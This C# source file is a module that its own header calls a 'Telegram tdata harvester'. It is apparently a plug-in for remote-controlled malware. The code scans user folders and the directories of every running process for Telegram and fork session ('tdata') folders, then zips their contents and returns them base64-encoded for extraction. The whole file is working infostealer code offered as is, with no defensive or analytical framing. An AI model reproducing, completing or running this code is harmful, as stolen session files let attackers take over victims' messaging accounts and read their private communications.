// language: C#, file: TelegramClientModule.cs, target: Windows net472
// Telegram tdata harvester — searches near ALL processes (catches forks: Ayugram, BetterTG, etc.)
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Threading.Tasks;

namespace Telegram
{
    public sealed class TelegramClientModule
    {
        public string Execute(string action, string payload)
        {
            try
            {
                switch (action)
                {
                    case "find":        return FindTdata();
                    case "collect":     return Collect(payload);
                    case "collect_all": return CollectAll();
                    case "status":      return GetStatus();
                    default:            return Err("Unknown action: " + action);
                }
            }
            catch (Exception ex) { return Err(ex.GetType().Name + ": " + ex.Message); }
        }

        // find → [{path, size_bytes, file_count}]
        private static string FindTdata()
        {
            var paths = GatherTdataPaths();
            var sb = new StringBuilder("[");
            bool first = true;
            foreach (var p in paths)
            {
                try
                {
                    long bytes = 0;
                    int  count = 0;
                    foreach (var f in Directory.GetFiles(p, "*", SearchOption.AllDirectories))
                    {
                        try { var fi = new FileInfo(f); bytes += fi.Length; count++; } catch { }
                    }
                    if (!first) sb.Append(',');
                    first = false;
                    sb.Append("{\"path\":").Append(Json(p))
                      .Append(",\"size_bytes\":").Append(bytes)
                      .Append(",\"file_count\":").Append(count)
                      .Append("}");
                }
                catch { }
            }
            sb.Append("]");
            return sb.ToString();
        }

        // collect → {"zip":"<base64>","size":<bytes>,"path":"...","file_count":<n>}
        private static string Collect(string payload)
        {
            var doc  = SimpleJson.Parse(payload);
            var path = doc.ContainsKey("tdata_path") ? doc["tdata_path"] : "";
            if (string.IsNullOrEmpty(path) || !Directory.Exists(path))
                return Err("tdata path not found: " + path);

            byte[] zipBytes = ZipDirectoryFull(path, "tdata");
            int    fc       = CountFiles(path);
            return "{\"zip\":\"" + Convert.ToBase64String(zipBytes)
                 + "\",\"size\":" + zipBytes.Length
                 + ",\"file_count\":" + fc
                 + ",\"path\":" + Json(path) + "}";
        }

        // collect_all → all found tdata paths merged into one zip
        private static string CollectAll()
        {
            var paths = GatherTdataPaths();
            if (paths.Count == 0) return Err("No tdata directories found");

            using (var ms = new MemoryStream())
            {
                using (var zip = new ZipArchive(ms, ZipArchiveMode.Create, leaveOpen: true))
                {
                    foreach (var tdataPath in paths)
                    {
                        try
                        {
                            string parentName = Path.GetFileName(Path.GetDirectoryName(tdataPath) ?? "") ?? "unknown";
                            string entryBase  = SanitizeName(parentName) + "_tdata";
                            AddDirectoryToZip(zip, tdataPath, entryBase);
                        }
                        catch { }
                    }
                }
                var bytes = ms.ToArray();
                return "{\"zip\":\"" + Convert.ToBase64String(bytes)
                     + "\",\"size\":" + bytes.Length
                     + ",\"path_count\":" + paths.Count + "}";
            }
        }

        private static string GetStatus()
        {
            var paths = GatherTdataPaths();
            var sb    = new StringBuilder("{");
            sb.Append("\"tdata_count\":").Append(paths.Count);
            sb.Append(",\"paths\":[");
            bool first = true;
            foreach (var p in paths) { if (!first) sb.Append(','); first = false; sb.Append(Json(p)); }
            sb.Append("]}");
            return sb.ToString();
        }

        // ── Discovery ─────────────────────────────────────────────────────────

        private static List<string> GatherTdataPaths()
        {
            var found = new ConcurrentDictionary<string, byte>(StringComparer.OrdinalIgnoreCase);

            // Pass 1 — AppData & LocalAppData: 2 levels deep (catches Company\AppName\tdata)
            var appRoots = new[]
            {
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            };

            Parallel.ForEach(appRoots, root =>
            {
                if (string.IsNullOrEmpty(root) || !Directory.Exists(root)) return;
                try
                {
                    var level1 = Directory.EnumerateDirectories(root, "*", SearchOption.TopDirectoryOnly);
                    Parallel.ForEach(level1, dir1 =>
                    {
                        try
                        {
                            // Level 1: %AppData%\SomeName\tdata
                            var td1 = Path.Combine(dir1, "tdata");
                            if (Directory.Exists(td1)) found.TryAdd(Path.GetFullPath(td1), 0);

                            // Level 2: %AppData%\Company\AppName\tdata
                            try
                            {
                                foreach (var dir2 in Directory.EnumerateDirectories(dir1, "*", SearchOption.TopDirectoryOnly))
                                {
                                    try
                                    {
                                        var td2 = Path.Combine(dir2, "tdata");
                                        if (Directory.Exists(td2)) found.TryAdd(Path.GetFullPath(td2), 0);
                                    }
                                    catch { }
                                }
                            }
                            catch { }
                        }
                        catch { }
                    });
                }
                catch { }
            });

            // Pass 2 — common user folders 2 levels deep (Desktop, Downloads, Documents — portable installs not in AppData)
            var userFolders = new[]
            {
                Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
                Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
            };

            Parallel.ForEach(userFolders, root =>
            {
                if (string.IsNullOrEmpty(root) || !Directory.Exists(root)) return;
                try
                {
                    var level1 = Directory.EnumerateDirectories(root, "*", SearchOption.TopDirectoryOnly);
                    Parallel.ForEach(level1, dir1 =>
                    {
                        try
                        {
                            var td1 = Path.Combine(dir1, "tdata");
                            if (Directory.Exists(td1)) found.TryAdd(Path.GetFullPath(td1), 0);
                            try
                            {
                                foreach (var dir2 in Directory.EnumerateDirectories(dir1, "*", SearchOption.TopDirectoryOnly))
                                {
                                    try
                                    {
                                        var td2 = Path.Combine(dir2, "tdata");
                                        if (Directory.Exists(td2)) found.TryAdd(Path.GetFullPath(td2), 0);
                                    }
                                    catch { }
                                }
                            }
                            catch { }
                        }
                        catch { }
                    });
                }
                catch { }
            });

            // Pass 3 — walk up to 3 levels from EVERY running process (catches portable installs)
            SearchNearAllProcesses("tdata", found, maxUp: 3);

            return new List<string>(found.Keys);
        }

        private static void SearchNearAllProcesses(string folderName, ConcurrentDictionary<string, byte> found, int maxUp)
        {
            var procPaths = BuildProcessPaths();
            if (procPaths.Count == 0) return;

            Parallel.ForEach(procPaths, exePath =>
            {
                try
                {
                    string dir = Path.GetDirectoryName(exePath);
                    for (int up = 0; up < maxUp && !string.IsNullOrEmpty(dir); up++)
                    {
                        var candidate = Path.Combine(dir, folderName);
                        if (Directory.Exists(candidate))
                        {
                            try { found.TryAdd(Path.GetFullPath(candidate), 0); } catch { }
                        }
                        dir = Path.GetDirectoryName(dir);
                    }
                }
                catch { }
            });
        }

        private static List<string> BuildProcessPaths()
        {
            var paths = new ConcurrentBag<string>();
            try
            {
                var procs = System.Diagnostics.Process.GetProcesses();
                Parallel.ForEach(procs, proc =>
                {
                    try
                    {
                        string exePath = proc.MainModule?.FileName;
                        if (!string.IsNullOrEmpty(exePath))
                            paths.Add(exePath);
                    }
                    catch { }
                    finally { try { proc.Dispose(); } catch { } }
                });
            }
            catch { }
            return new List<string>(paths);
        }

        // ── ZIP helpers ────────────────────────────────────────────────────────

        private static byte[] ZipDirectoryFull(string dirPath, string entryBase)
        {
            using (var ms = new MemoryStream())
            {
                using (var zip = new ZipArchive(ms, ZipArchiveMode.Create, leaveOpen: true))
                    AddDirectoryToZip(zip, dirPath, entryBase);
                return ms.ToArray();
            }
        }

        private static void AddDirectoryToZip(ZipArchive zip, string dirPath, string entryBase)
        {
            foreach (var file in Directory.GetFiles(dirPath, "*", SearchOption.AllDirectories))
            {
                try
                {
                    string rel       = file.Length > dirPath.Length
                        ? file.Substring(dirPath.Length).TrimStart('\\', '/')
                        : Path.GetFileName(file);
                    string entryName = entryBase + "/" + rel.Replace('\\', '/');
                    zip.CreateEntryFromFile(file, entryName, CompressionLevel.Fastest);
                }
                catch { }
            }
        }

        private static int CountFiles(string dirPath)
        {
            try { return Directory.GetFiles(dirPath, "*", SearchOption.AllDirectories).Length; }
            catch { return 0; }
        }

        private static string SanitizeName(string s)
        {
            var sb  = new StringBuilder();
            var bad = Path.GetInvalidFileNameChars();
            foreach (char c in s) sb.Append(Array.IndexOf(bad, c) >= 0 ? '_' : c);
            return sb.Length > 0 ? sb.ToString() : "unknown";
        }

        // ── JSON helpers ───────────────────────────────────────────────────────
        private static string Err(string msg)
            => "{\"success\":false,\"error\":\"" + msg.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "").Replace("\n", " ") + "\"}";

        private static string Json(string s)
        {
            if (s == null) return "null";
            return "\"" + s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "\\r").Replace("\n", "\\n").Replace("\t", "\\t") + "\"";
        }
    }

    internal static class SimpleJson
    {
        internal static System.Collections.Generic.Dictionary<string, string> Parse(string json)
        {
            var result = new System.Collections.Generic.Dictionary<string, string>(StringComparer.Ordinal);
            if (string.IsNullOrWhiteSpace(json)) return result;
            json = json.Trim();
            if (json.StartsWith("{")) json = json.Substring(1, json.Length - 2);
            int i = 0;
            while (i < json.Length)
            {
                while (i < json.Length && (json[i] == ',' || json[i] == ' ' || json[i] == '\r' || json[i] == '\n' || json[i] == '\t')) i++;
                if (i >= json.Length) break;
                var key = ReadString(json, ref i);
                while (i < json.Length && (json[i] == ':' || json[i] == ' ')) i++;
                var value = ReadValue(json, ref i);
                if (key != null && value != null) result[key] = value;
            }
            return result;
        }
        private static string ReadString(string s, ref int i)
        {
            if (i >= s.Length || s[i] != '"') return null;
            i++;
            var sb = new StringBuilder();
            while (i < s.Length && s[i] != '"')
            {
                if (s[i] == '\\' && i + 1 < s.Length) { i++; switch (s[i]) { case '"': sb.Append('"'); break; case '\\': sb.Append('\\'); break; case 'n': sb.Append('\n'); break; case 'r': sb.Append('\r'); break; default: sb.Append(s[i]); break; } }
                else sb.Append(s[i]);
                i++;
            }
            if (i < s.Length) i++;
            return sb.ToString();
        }
        private static string ReadValue(string s, ref int i)
        {
            if (i >= s.Length) return null;
            if (s[i] == '"') return ReadString(s, ref i);
            var start = i;
            while (i < s.Length && s[i] != ',' && s[i] != '}') i++;
            return s.Substring(start, i - start).Trim();
        }
    }
}
